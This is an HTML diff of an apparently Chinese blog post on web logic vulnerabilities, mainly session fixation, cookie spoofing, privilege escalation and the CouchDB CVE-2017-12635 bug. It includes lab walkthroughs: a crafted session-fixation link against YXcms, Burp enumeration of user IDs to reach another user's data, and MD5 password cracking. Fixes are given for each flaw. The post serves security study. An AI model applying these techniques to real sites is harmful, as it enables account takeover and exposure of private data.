src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
 
 
 
 
-<main class="post-container content">
 
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-07-29T12:11:20.670Z">2023-07-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-08-02T09:27:31.833Z">2023-08-02</time></span></div></div></div>
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                常见top漏洞
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-29
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-02
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    12.4k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    45 分
-                </div>
-                
-
-                
-            </div>
-        </div>
-        <hr class="clearfix">
-
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>逻辑漏洞</span></h1>
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1>浅析逻辑漏洞</h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="浅析逻辑漏洞">浅析逻辑漏洞</h1>
 <h2 id="1-漏洞介绍">1. 漏洞介绍</h2>
-<h3 id="1-1-成因">1.1 成因</h3>
+<h3 id="11-成因">1.1 成因</h3>
 <p>设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致</p>
 <pre><code>	逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。
 </code></pre>
 <p>​		逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性, 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。</p>
 <p>这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。</p>
-<h3 id="1-2-分析">1.2 分析</h3>
+<h3 id="12-分析">1.2 分析</h3>
 <p>​		对常见的漏洞进行过统计，发现其中越权操作和逻辑漏洞占比最高，很多平台中基本都有发现，包括任意查询用户信息、任意删除等行为；最严重的漏洞出现在账号安全，包括重置任意用户密码、验证码暴力破解等。</p>
 <p><strong>逻辑漏洞的重要性</strong></p>
 <p>常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来，并且传统的安全设备或者防护措施收效甚微</p>
 <p>​		但逻辑漏洞是和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则脚本和漏扫工具扫描出来，因此逻辑漏洞大多需要配合代码审计和手段测试才可以发现相关漏洞，也是工具无法代替人工的漏洞。</p>
-<p><img src="image-20230706213619400.png" alt="image-20230706213619400"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230706213619400.png" alt="image-20230706213619400"></p>
 <h2 id="2-逻辑漏洞详解">2. 逻辑漏洞详解</h2>
-<h3 id="2-1-常见的逻辑漏洞">2.1 常见的逻辑漏洞</h3>
-<pre class="line-numbers language-none"><code class="language-none">逻辑漏洞的分类
+<h3 id="21-常见的逻辑漏洞">2.1 常见的逻辑漏洞</h3>
+<pre><code class="hljs plaintext">逻辑漏洞的分类
 
     越权漏洞
 
@@ -471,11 +184,11 @@
 
     短信轰炸
 
-即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="2-2-如何挖掘逻辑漏洞">2.2 如何挖掘逻辑漏洞</h3>
+即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。</code></pre>
+<h3 id="22-如何挖掘逻辑漏洞">2.2 如何挖掘逻辑漏洞</h3>
 <pre><code>确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题        
 </code></pre>
-<h3 id="2-3-身份验证漏洞">2.3 身份验证漏洞</h3>
+<h3 id="23-身份验证漏洞">2.3 身份验证漏洞</h3>
 <h4 id="1-暴力破解漏洞">1. 暴力破解漏洞</h4>
 <p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作</p>
 <p>漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举</p>
@@ -486,11 +199,11 @@
 <p>但是不能永久锁定，可能被用来进行账户恶意锁定</p>
 </blockquote>
 <p>对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
-<h4 id="2-Session固定攻击">2. Session固定攻击</h4>
+<h4 id="2-session固定攻击">2. Session固定攻击</h4>
 <p>漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人</p>
 <p>漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息</p>
 <p>攻击流程：</p>
-<pre class="line-numbers language-none"><code class="language-none">1、攻击者Attacker能正常访问该应用网站；
+<pre><code class="hljs plaintext">1、攻击者Attacker能正常访问该应用网站；
 
 2、应用网站服务器返回一个会话ID给他；
 
@@ -500,11 +213,11 @@
 
 6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。
 
-这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的</code></pre>
 <p>漏洞点：在GET方法请求登录时候带有session值</p>
-<pre class="line-numbers language-none"><code class="language-none">访问网站（未登录）：获取cookie信息，获取sessionid
+<pre><code class="hljs plaintext">访问网站（未登录）：获取cookie信息，获取sessionid
 登录网站：查看cookie信息，获取sessionid
-查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞</code></pre>
 <p>修复思路：</p>
 <blockquote>
 <p>只要避免在URL中带入session信息即可比较有效的防御</p>
@@ -514,36 +227,36 @@
 <p>这里用YXcms建站系统复现，由于源代码太难找了，这里就跟着走吧…</p>
 <h5 id="复现过程">复现过程</h5>
 <p>yxcms允许我们自定义session，而且这个过程通过get方式来完成。我觉得这样的问题属于CSRF，不经意之间就能获取大效果。其问题代码如下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
-<span class="token comment">//公共类&lt;br&gt;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">commonController</span> <span class="token keyword">extends</span> <span class="token class-name">baseController</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
- <span class="token punctuation">{</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
- <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phpsessid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phpsessid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过GET方法传递sessionid,firefox&lt;br&gt;</span>
-        <span class="token function">session_starts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
- ……</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>&lt;br&gt;
+<span class="hljs-comment">//公共类&lt;br&gt;</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commonController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">baseController</span></span>{<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)&lt;<span class="hljs-title">br</span>&gt;</span>
+<span class="hljs-function"> </span>{&lt;br&gt;
+ <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();&lt;br&gt;
+        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'phpsessid'</span>])) <span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'phpsessid'</span>]);<span class="hljs-comment">//通过GET方法传递sessionid,firefox&lt;br&gt;</span>
+        <span class="hljs-title function_ invoke__">session_starts</span>();&lt;br&gt;
+ ……</code></pre>
 <p>当$_GET[‘phpsessid’]非空时，就令session_id为我们传入的值。<br>
 于是我们构造一个链接让管理员点击，管理员点击后会重新设置他的session，而且这个session就是我们构造的。因为session重置了所以管理员也需要重新登录，而重新登录后其session_id就是我们构造的。我们只要利用这个session_id就能登录管理后台了。</p>
 <p>比如我构造一个链接：</p>
-<pre class="line-numbers language-none"><code class="language-none">http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456</code></pre>
 <p>将这个链接发给受害者（火狐浏览器），诱使受害者管理员点击该链接，点击后后会跳转到登录页面，但此时他的phpsession已经是我们构造的f4cking456了</p>
-<p><img src="image-20230707192616715.png" alt="image-20230707192616715"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707192616715.png" alt="image-20230707192616715"></p>
 <p>此时如果受害者登录这个网址，那么这个session就有后台权限了。<br>
 假如受害者登录该网址</p>
-<p><img src="image-20230707192633721.png" alt="image-20230707192633721"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707192633721.png" alt="image-20230707192633721"></p>
 <p>那么我们利用这个链接</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456%EF%BC%8C%E5%B0%86%E8%87%AA%E5%B7%B1%E7%9A%84session%E8%AE%BE%E7%BD%AE%E6%88%90f4cking456%EF%BC%8C%E6%88%96%E8%80%85%E9%9A%8F%E6%84%8F%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%8A%8Aphpsessid%E4%BF%AE%E6%94%B9%E6%88%90f4cking123%E5%B0%B1%E8%83%BD%E6%8B%A5%E6%9C%89%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90%E4%BA%86">http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456，将自己的session设置成f4cking456，或者随意怎么修改，只要把phpsessid修改成f4cking123就能拥有后台权限了</a></p>
 <p>这时攻击者（谷歌浏览器）访问该链接，直接进入后台界面</p>
-<p><img src="image-20230707192717088.png" alt="image-20230707192717088"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707192717088.png" alt="image-20230707192717088"></p>
 <p>有个前提就是，实战过程中你需要知道该网站后台地址是什么</p>
-<h4 id="3-Cookie欺骗漏洞">3. Cookie欺骗漏洞</h4>
+<h4 id="3-cookie欺骗漏洞">3. Cookie欺骗漏洞</h4>
 <p>漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。</p>
 <p>漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookie中，网站通过获取得到的cookie进行授权或者身份验证</p>
 <p>漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin</p>
 <p>漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改</p>
-<h5 id="漏洞实战-2">漏洞实战</h5>
+<h5 id="漏洞实战">漏洞实战</h5>
 <p>大体就是通过某种手段获取其他用户或者管理员的cookie，而由于该cookie存储的是可理解的身份信息和登录信息，则攻击者获取该cookie后，凭借该cookie登录网站便可以实现免密登录到其他用户或者管理员页面</p>
-<h3 id="2-4-权限类逻辑漏洞">2.4 权限类逻辑漏洞</h3>
+<h3 id="24-权限类逻辑漏洞">2.4 权限类逻辑漏洞</h3>
 <p>权限相关逻辑漏洞是逻辑漏洞中出现的最多的漏洞</p>
 <h4 id="1-平行权限跨越">1. 平行权限跨越</h4>
 <p>漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能</p>
@@ -554,29 +267,29 @@
 <p>需要在方法中进行相关的获取请求request，再利用getAttribute(“userid”)获取其userid，直接使用该userid作为参数进行数据增删查改，避免userid参数传输</p>
 <h5 id="漏洞复现">漏洞复现</h5>
 <p>登录，同时bp抓包：</p>
-<p><img src="image-20230707195809298.png" alt="image-20230707195809298"></p>
-<p><img src="image-20230707195907016.png" alt="image-20230707195907016"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707195809298.png" alt="image-20230707195809298"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707195907016.png" alt="image-20230707195907016"></p>
 <p>放包，可以看到当前的test用户（这里放包了很多次…）</p>
-<p><img src="image-20230707200042178.png" alt="image-20230707200042178"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200042178.png" alt="image-20230707200042178"></p>
 <p>在这里可以看到这个card_id对应的就是每个用户对应的id</p>
 <p>发送到爆破模块遍历一下，这里他是对后两位进行的遍历</p>
-<p><img src="image-20230707200214634.png" alt="image-20230707200214634"></p>
-<p><img src="image-20230707200304348.png" alt="image-20230707200304348"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200214634.png" alt="image-20230707200214634"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200304348.png" alt="image-20230707200304348"></p>
 <p>然后来到登录界面，右键查看马春生的图片，检查源代码属性：发现其id尾号以16结尾，我们开始爆破</p>
-<p><img src="image-20230707200358755.png" alt="image-20230707200358755"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200358755.png" alt="image-20230707200358755"></p>
 <p>这里就是马春生的个人信息</p>
-<p><img src="image-20230707200500204.png" alt="image-20230707200500204"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200500204.png" alt="image-20230707200500204"></p>
 <p>我们将密码拿去md5破解一下</p>
-<p><img src="image-20230707200644088.png" alt="image-20230707200644088"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200644088.png" alt="image-20230707200644088"></p>
 <p>随后凭借该用户名和密码登录即可，成功拿到key</p>
-<p><img src="image-20230707200729146.png" alt="image-20230707200729146"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230707200729146.png" alt="image-20230707200729146"></p>
 <h5 id="漏洞总结">漏洞总结</h5>
 <p>先公布一下背景</p>
-<pre class="line-numbers language-none"><code class="language-none">钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。</code></pre>
 <p>这里我也是跟着教程做的，因此几乎没有自己的思考，为了不摸鱼，还是浅浅总结一下</p>
 <p>题目告知我们重点是马春生，那我们便要实现水平越权以便以马春生的用户信息登录网站，那我们进入靶场（我尽可能的以实战的思路来吧），首先就是搜集信息，burp抓包，F12这些肯定是少不了的，这里也是学到了一点东西，搜集信息尤为重要</p>
-<pre class="line-numbers language-none"><code class="language-none">这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些
-我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs plaintext">这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些
+我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护）</code></pre>
 <h4 id="2-垂直权限跨越">2. 垂直权限跨越</h4>
 <p>漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能</p>
 <p>形成原因：程序在方法调用时候，缺少角色等级校验</p>
@@ -585,39 +298,39 @@
 <p>漏洞修复：</p>
 <p>需要校验用户是否有权限访问这个方法</p>
 <p>获取请求request，再利用getAuttribute(“roleid”)获取其角色等级，检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息，值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。</p>
-<h5 id="Couchdb-垂直越权（CVE-2017-12635）">Couchdb 垂直越权（CVE-2017-12635）</h5>
-<pre class="line-numbers language-none"><code class="language-none">Couchdb简介
+<h5 id="couchdb-垂直越权cve-2017-12635">Couchdb 垂直越权（CVE-2017-12635）</h5>
+<pre><code class="hljs plaintext">Couchdb简介
 	Apache CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。
 
 ​ 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
 
-​ 影响版本：Apache CouchDB before 1.7.0 and 2.x before 2.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+​ 影响版本：Apache CouchDB before 1.7.0 and 2.x before 2.1.1</code></pre>
 <p><strong>漏洞成因</strong></p>
 <p>问题在于 Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为<a target="_blank" rel="noopener" href="https://github.com/apache/couchdb-jiffy">jiffy</a>的解析器之间存在差异。查看每个对象如何处理对象上的重复键，例如：<code>{"foo":"bar", "foo":"baz"}</code></p>
 <p>Erlang：</p>
-<pre class="line-numbers language-jiffy" data-language="jiffy"><code class="language-jiffy">&gt; jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}"). 
-{[{&lt;&lt;"foo"&gt;&gt;,&lt;&lt;"bar"&gt;&gt;},{&lt;&lt;"foo"&gt;&gt;,&lt;&lt;"baz"&gt;&gt;}]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs jiffy">&gt; jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}"). 
